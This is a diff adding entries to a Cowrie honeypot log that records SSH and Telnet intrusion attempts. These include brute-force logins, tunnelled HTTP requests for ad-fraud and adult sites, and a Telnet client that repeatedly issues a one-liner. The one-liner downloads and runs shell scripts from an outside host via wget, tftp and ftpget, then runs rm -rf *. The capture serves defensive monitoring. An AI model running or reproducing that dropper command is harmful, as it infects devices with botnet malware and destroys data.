@@ -2494,3 +2494,257 @@
 2017-04-30T01:34:00+0000 [HoneyPotSSHTransport,48962,179.43.134.101] avatar admin logging out
 2017-04-30T01:34:00+0000 [HoneyPotSSHTransport,48962,179.43.134.101] connection lost
 2017-04-30T01:34:00+0000 [HoneyPotSSHTransport,48962,179.43.134.101] Connection lost after 905 seconds
+2017-04-30T01:34:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] got channel 'direct-tcpip' request
+2017-04-30T01:34:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] direct-tcp connection request to 104.81.104.99:443 from localhost:5556
+2017-04-30T01:34:03+0000 [SSHChannel None (115) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] direct-tcp forward to 104.81.104.99:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80dm\xe7\xb1 \xf0*\xf2\xa1\xfe\x93\x05\xb9\xe3\xea>9\xc4Q\xb1\xcd\xd1\x8b\xbap\xdb\xe1\xf3L\x82\x08\xbf'
+2017-04-30T01:34:03+0000 [SSHChannel None (115) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] failed to connect: Connection refused
+2017-04-30T01:34:03+0000 [SSHChannel None (115) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48866,91.195.103.185] sending close 115
+2017-04-30T01:34:07+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 92.53.120.87:9224 (10.8.41.81:2222) [session: 7813e60d]
+2017-04-30T01:34:07+0000 [HoneyPotSSHTransport,48983,92.53.120.87] Remote SSH version: SSH-2.0-libssh2_1.7.0
+2017-04-30T01:34:07+0000 [HoneyPotSSHTransport,48983,92.53.120.87] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-04-30T01:34:07+0000 [HoneyPotSSHTransport,48983,92.53.120.87] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-30T01:34:07+0000 [HoneyPotSSHTransport,48983,92.53.120.87] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-30T01:34:07+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T01:34:07+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T01:34:07+0000 [CowrieTelnetTransport,29796,51.15.5.250] Closing TTY Log: log/tty/20170430-013205-None-29796i.log after 122 seconds
+2017-04-30T01:34:07+0000 [CowrieTelnetTransport,29796,51.15.5.250] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-04-30T01:34:07+0000 [CowrieTelnetTransport,29796,51.15.5.250] Connection lost after 128 seconds
+2017-04-30T01:34:08+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T01:34:08+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T01:34:08+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T01:34:08+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T01:34:08+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T01:34:08+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T01:34:08+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T01:34:08+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T01:34:08+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:08+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 46.4.59.3:65346 (10.8.41.81:2222) [session: cda8b236]
+2017-04-30T01:34:08+0000 [HoneyPotSSHTransport,48984,46.4.59.3] Remote SSH version: SSH-2.0-PuTTY_Release_0.63
+2017-04-30T01:34:08+0000 [HoneyPotSSHTransport,48984,46.4.59.3] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-04-30T01:34:08+0000 [HoneyPotSSHTransport,48984,46.4.59.3] outgoing: 'aes256-ctr' 'hmac-sha1' 'none'
+2017-04-30T01:34:08+0000 [HoneyPotSSHTransport,48984,46.4.59.3] incoming: 'aes256-ctr' 'hmac-sha1' 'none'
+2017-04-30T01:34:09+0000 [HoneyPotSSHTransport,48983,92.53.120.87] NEW KEYS
+2017-04-30T01:34:09+0000 [HoneyPotSSHTransport,48983,92.53.120.87] starting service 'ssh-userauth'
+2017-04-30T01:34:09+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48983,92.53.120.87] 'vnc' trying auth 'password'
+2017-04-30T01:34:09+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48983,92.53.120.87] login attempt: 2
+2017-04-30T01:34:09+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48983,92.53.120.87] login return, expect: [xerox/xerox123]
+2017-04-30T01:34:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48983,92.53.120.87] login attempt [vnc/vnc] failed
+2017-04-30T01:34:10+0000 [HoneyPotSSHTransport,48984,46.4.59.3] NEW KEYS
+2017-04-30T01:34:10+0000 [HoneyPotSSHTransport,48984,46.4.59.3] starting service 'ssh-userauth'
+2017-04-30T01:34:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48984,46.4.59.3] 'user' trying auth 'none'
+2017-04-30T01:34:12+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48984,46.4.59.3] 'user' authenticated with 'none'
+2017-04-30T01:34:12+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48984,46.4.59.3] starting service 'ssh-connection'
+2017-04-30T01:34:12+0000 [-] 'vnc' failed auth 'password'
+2017-04-30T01:34:12+0000 [-] unauthorized login: 
+2017-04-30T01:34:12+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] got channel 'direct-tcpip' request
+2017-04-30T01:34:12+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] direct-tcp connection request to 52.223.196.158:80 from localhost:5556
+2017-04-30T01:34:12+0000 [HoneyPotSSHTransport,48983,92.53.120.87] connection lost
+2017-04-30T01:34:12+0000 [HoneyPotSSHTransport,48983,92.53.120.87] Connection lost after 4 seconds
+2017-04-30T01:34:12+0000 [SSHChannel None (133) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] direct-tcp forward to 52.223.196.158:80 with data 'GET /v0/CtIBJMMl8QzmdyPIukEu9ByfqLRWuUhZKT20Hk5OOeRgkLpRr40RimNAokigFyug_hOBOC1MXbMAF8RgDJ4VMME0QXCkIqctn5snadrMlwluL7S01sdRVRX0TnjNZ9_aXiPXstLXkLgomVTNcIqvzH8BpRUzk6PiT8qwwsyFGjU2bE2yv9swxc0YHYqqtOxcEQMT7dPOJWQmmKgsPfxUXss3NbRYdwjoaRZxmVjNT2hUt_HZ15gIyfnaSAP4sXAUNlZpTBNO5abNIBu9kY6fKLv_TZqUEhA62SKNNhM-bWfEi7-gPpYYGgzl9xViXCYpyLn2WrI/index-live.m3u8 HTTP/1.1\r\nHost: video-edge-c2aa38.fra02.hls.ttvnw.net\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n'
+2017-04-30T01:34:12+0000 [SSHChannel None (133) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] failed to connect: Connection refused
+2017-04-30T01:34:12+0000 [SSHChannel None (133) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] sending close 133
+2017-04-30T01:34:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] got channel 'direct-tcpip' request
+2017-04-30T01:34:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] direct-tcp connection request to 209.239.126.77:80 from 0.0.0.0:0
+2017-04-30T01:34:15+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] direct-tcp forward to 209.239.126.77:80 with data 'GET /load/hit_1.php?source_id=1371&sub_id=&source_mk=99feba92 HTTP/1.1\r\nHost: 1371.hit.buy-targeted-traffic.com\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.3; OfficeLivePatch.0.0; InfoPath.3; BRI/2)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip,deflate\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n'
+2017-04-30T01:34:15+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] failed to connect: Connection refused
+2017-04-30T01:34:15+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] sending close 0
+2017-04-30T01:34:15+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] remote eof
+2017-04-30T01:34:15+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] remote close
+2017-04-30T01:34:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] got channel 'direct-tcpip' request
+2017-04-30T01:34:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] direct-tcp connection request to 104.24.120.46:80 from 0.0.0.0:0
+2017-04-30T01:34:15+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] direct-tcp forward to 104.24.120.46:80 with data 'GET / HTTP/1.1\r\nHost: suckypussy.com\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.3; OfficeLivePatch.0.0; InfoPath.3; BRI/2)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nReferer: http://www.google.com/url?sa=t&rct=j&q=glam+clothed+lesbos+rim&esrc=s&source=web&cd=200&cad=rja&ved=0CCAQFjAA&url=http%3A%2F%2Fwww.itunemusic.online%2F&ei=HlyPUMO3FMSPrge8y4DwAQ&usg=AFQjCNF\r\nAccept-Encoding: gzip,deflate\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n'
+2017-04-30T01:34:15+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] failed to connect: Connection refused
+2017-04-30T01:34:15+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] sending close 1
+2017-04-30T01:34:15+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] remote eof
+2017-04-30T01:34:15+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48984,46.4.59.3] remote close
+2017-04-30T01:34:16+0000 [HoneyPotSSHTransport,48984,46.4.59.3] avatar user logging out
+2017-04-30T01:34:16+0000 [HoneyPotSSHTransport,48984,46.4.59.3] connection lost
+2017-04-30T01:34:16+0000 [HoneyPotSSHTransport,48984,46.4.59.3] Connection lost after 7 seconds
+2017-04-30T01:34:17+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T01:34:17+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T01:34:17+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T01:34:18+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T01:34:18+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T01:34:18+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T01:34:18+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T01:34:18+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T01:34:18+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T01:34:18+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T01:34:18+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:22+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48849,91.195.103.195] got channel 'direct-tcpip' request
+2017-04-30T01:34:22+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48849,91.195.103.195] direct-tcp connection request to 66.96.160.139:25 from localhost:5556
+2017-04-30T01:34:26+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T01:34:26+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T01:34:28+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T01:34:28+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T01:34:28+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T01:34:28+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T01:34:28+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T01:34:28+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T01:34:28+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:28+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T01:34:28+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T01:34:28+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T01:34:28+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T01:34:28+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T01:34:28+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T01:34:28+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T01:34:28+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T01:34:28+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T01:34:29+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T01:34:29+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T01:34:29+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T01:34:29+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T01:34:29+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:29+0000 [CowrieTelnetTransport,29797,51.15.5.250] Connection lost after 127 seconds
+2017-04-30T01:34:36+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T01:34:36+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T01:34:36+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T01:34:36+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T01:34:36+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T01:34:36+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T01:34:36+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T01:34:36+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T01:34:36+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T01:34:36+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T01:34:36+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:37+0000 [CowrieTelnetTransport,29798,51.15.5.250] Connection lost after 127 seconds
+2017-04-30T01:34:42+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 5.9.43.239:50226 (10.8.41.81:2222) [session: 13d2fc9d]
+2017-04-30T01:34:42+0000 [HoneyPotSSHTransport,48985,5.9.43.239] Remote SSH version: SSH-2.0-PuTTY_Release_0.63
+2017-04-30T01:34:42+0000 [HoneyPotSSHTransport,48985,5.9.43.239] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-04-30T01:34:42+0000 [HoneyPotSSHTransport,48985,5.9.43.239] outgoing: 'aes256-ctr' 'hmac-sha1' 'none'
+2017-04-30T01:34:42+0000 [HoneyPotSSHTransport,48985,5.9.43.239] incoming: 'aes256-ctr' 'hmac-sha1' 'none'
+2017-04-30T01:34:44+0000 [HoneyPotSSHTransport,48985,5.9.43.239] NEW KEYS
+2017-04-30T01:34:44+0000 [HoneyPotSSHTransport,48985,5.9.43.239] starting service 'ssh-userauth'
+2017-04-30T01:34:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48985,5.9.43.239] 'user' trying auth 'none'
+2017-04-30T01:34:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48985,5.9.43.239] 'user' authenticated with 'none'
+2017-04-30T01:34:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48985,5.9.43.239] starting service 'ssh-connection'
+2017-04-30T01:34:45+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T01:34:45+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T01:34:45+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T01:34:45+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T01:34:46+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T01:34:46+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T01:34:46+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T01:34:46+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T01:34:46+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T01:34:46+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T01:34:46+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T01:34:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48985,5.9.43.239] got channel 'direct-tcpip' request
+2017-04-30T01:34:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48985,5.9.43.239] direct-tcp connection request to 104.28.8.180:80 from 0.0.0.0:0
+2017-04-30T01:34:52+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48985,5.9.43.239] direct-tcp forward to 104.28.8.180:80 with data 'GET / HTTP/1.1\r\nHost: youradultube.com\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-gb; SAMSUNG GT-N7105/N7105XXUENA1 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nReferer: http://www.247bigboobs.com/tits/\r\nAccept-Encoding: gzip,deflate\r\nAccept-Language: en-GB;q=0.9,en;q=0.5\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n'
+2017-04-30T01:34:52+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48985,5.9.43.239] failed to connect: Connection refused
+2017-04-30T01:34:52+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48985,5.9.43.239] sending close 0
